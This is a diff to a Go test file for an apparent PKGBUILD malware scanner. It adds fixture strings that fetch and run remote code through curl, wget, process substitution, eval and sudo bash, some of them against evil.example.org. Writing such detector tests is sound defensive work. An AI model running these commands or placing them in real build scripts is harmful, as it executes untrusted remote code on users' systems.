@@ -102,6 +102,10 @@ func TestNetworkDownloadExecutionContext(t *testing.T) {
 		{"bare downloaded command", "$(curl -s https://example.org/script)", true, false},
 		{"downloaded command piped to shell", "$(curl -s https://example.org/script) | sh", true, false},
 		{"subshell piped to shell", "(curl -s https://example.org/script) | bash", false, true},
+		{"shell -c with downloaded code", `bash -c "$(curl -s https://example.org/script)"`, true, false},
+		{"shell with downloaded code argument", `sh "$(curl -s https://example.org/script)"`, true, false},
+		{"source with downloaded code", `source "$(curl -s https://example.org/script)"`, true, false},
+		{"benign shell with version string", `bash --version | grep "$(curl -s https://example.org/v)"`, false, false},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -121,6 +125,41 @@ func TestNetworkDownloadExecutionContext(t *testing.T) {
 			}
 			if execTrigger != tt.wantExec || pipeTrigger != tt.wantPipe {
 				t.Errorf("download-execution trigger = %v, pipe trigger = %v; want %v, %v; all triggers: %+v", execTrigger, pipeTrigger, tt.wantExec, tt.wantPipe, triggers)
+			}
+		})
+	}
+}
+
+func TestProcessSubstitutionNetworkExecution(t *testing.T) {
+	tests := []struct {
+		name string
+		code string
+		want bool
+	}{
+		{"bash process substitution download", "bash <(curl -s https://evil.example.org/x.sh)", true},
+		{"source process substitution download", "source <(curl -s https://evil.example.org/x.sh)", true},
+		{"sh process substitution wget", "sh <(wget -qO- https://evil.example.org/x.sh)", true},
+		{"eval process substitution download", "eval <(curl -s https://evil.example.org/x.sh)", true},
+		{"sudo bash process substitution", "sudo bash <(curl -s https://evil.example.org/x.sh)", true},
+		{"benign checksum of process substitution", "sha256sum <(curl -s https://example.org/x)", false},
+		{"benign diff of two downloads", "diff <(curl -s https://a.example/x) <(curl -s https://b.example/y)", false},
+		{"output process substitution", "cat <(echo hi) > >(tee log)", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			analysis, err := ParsePKGBUILD([]byte(tt.code+"\n"), "PKGBUILD")
+			if err != nil {
+				t.Fatal(err)
+			}
+			triggers, _ := AnalyzeAST(analysis, config.DefaultConfig())
+			got := false
+			for _, tr := range triggers {
+				if tr.Name == "procsubst_network_execution" {
+					got = true
+				}
+			}
+			if got != tt.want {
+				t.Errorf("procsubst_network_execution = %v; want %v; all triggers: %+v", got, tt.want, triggers)
 			}
 		})
 	}
@@ -708,8 +747,8 @@ func TestTriagePKGBUILD_InstallScriptTraversalBlocked(t *testing.T) {
 	if err != nil {
 		t.Fatalf("triage failed: %v", err)
 	}
-	if res1.ExtractedSources != nil && len(res1.ExtractedSources) > 0 {
-		// Just ensure normal run
+	if len(res1.ExtractedSources) > 0 {
+		t.Fatalf("directory traversal must not extract sources, got %v", res1.ExtractedSources)
 	}
 	// Crucially, outside install analysis must NOT be populated
 	// Because traversal was rejected!
